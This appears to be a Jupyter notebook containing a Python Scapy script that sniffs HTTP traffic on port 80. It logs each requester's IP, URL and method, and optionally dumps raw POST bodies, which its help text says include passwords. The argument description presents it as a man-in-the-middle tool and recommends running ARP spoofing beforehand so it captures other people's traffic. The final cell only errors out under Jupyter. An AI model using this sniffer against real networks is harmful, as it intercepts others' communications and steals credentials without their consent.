{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "from scapy.all import *\n",
    "from scapy.layers.http import HTTPRequest # import HTTP packet\n",
    "from colorama import init, Fore\n",
    "# initialize colorama\n",
    "init()\n",
    "# define colors\n",
    "GREEN = Fore.GREEN\n",
    "RED   = Fore.RED\n",
    "RESET = Fore.RESET"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "def sniff_packets(iface=None):\n",
    "    \"\"\"\n",
    "    Sniff 80 port packets with `iface`, if None (default), then the\n",
    "    Scapy's default interface is used\n",
    "    \"\"\"\n",
    "    if iface:\n",
    "        # port 80 for http (generally)\n",
    "        # `process_packet` is the callback\n",
    "        sniff(filter=\"port 80\", prn=process_packet, iface=iface, store=False)\n",
    "    else:\n",
    "        # sniff with default interface\n",
    "        sniff(filter=\"port 80\", prn=process_packet, store=False)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "def process_packet(packet):\n",
    "    \"\"\"\n",
    "    This function is executed whenever a packet is sniffed\n",
    "    \"\"\"\n",
    "    if packet.haslayer(HTTPRequest):\n",
    "        # if this packet is an HTTP Request\n",
    "        # get the requested URL\n",
    "        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()\n",
    "        # get the requester's IP Address\n",
    "        ip = packet[IP].src\n",
    "        # get the request method\n",
    "        method = packet[HTTPRequest].Method.decode()\n",
    "        print(f\"\\n{GREEN}[+] {ip} Requested {url} with {method}{RESET}\")\n",
    "        if show_raw and packet.haslayer(Raw) and method == \"POST\":\n",
    "            # if show_raw flag is enabled, has raw data, and the requested method is \"POST\"\n",
    "            # then show raw\n",
    "            print(f\"\\n{RED}[*] Some useful Raw data: {packet[Raw].load}{RESET}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "usage: ipykernel_launcher.py [-h] [-i IFACE] [--show-raw]\n",
      "ipykernel_launcher.py: error: unrecognized arguments: -f C:\\Users\\ANUKOOL SRIVASTAVA\\AppData\\Roaming\\jupyter\\runtime\\kernel-3f5dd8dc-2b0d-4e35-89e1-64011007cd86.json\n"
     ]
    },
    {
     "ename": "SystemExit",
     "evalue": "2",
     "output_type": "error",
     "traceback": [
      "An exception has occurred, use %tb to see the full traceback.\n",
      "\u001b[1;31mSystemExit\u001b[0m\u001b[1;31m:\u001b[0m 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "c:\\users\\anukool srivastava\\appdata\\local\\programs\\python\\python37-32\\lib\\site-packages\\IPython\\core\\interactiveshell.py:3334: UserWarning: To exit: use 'exit', 'quit', or Ctrl-D.\n",
      "  warn(\"To exit: use 'exit', 'quit', or Ctrl-D.\", stacklevel=1)\n"
     ]
    }
   ],
   "source": [
    "if __name__ == \"__main__\":\n",
    "    import argparse\n",
    "    parser = argparse.ArgumentParser(description=\"HTTP Packet Sniffer, this is useful when you're a man in the middle.\" \\\n",
    "                                                 + \"It is suggested that you run arp spoof before you use this script, otherwise it'll sniff your personal packets\")\n",
    "    parser.add_argument(\"-i\", \"--iface\", help=\"Interface to use, default is scapy's default interface\")\n",
    "    parser.add_argument(\"--show-raw\", dest=\"show_raw\", action=\"store_true\", help=\"Whether to print POST raw data, such as passwords, search queries, etc.\")\n",
    "    # parse arguments\n",
    "    args = parser.parse_args()\n",
    "    iface = args.iface\n",
    "    show_raw = args.show_raw\n",
    "    sniff_packets(iface)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
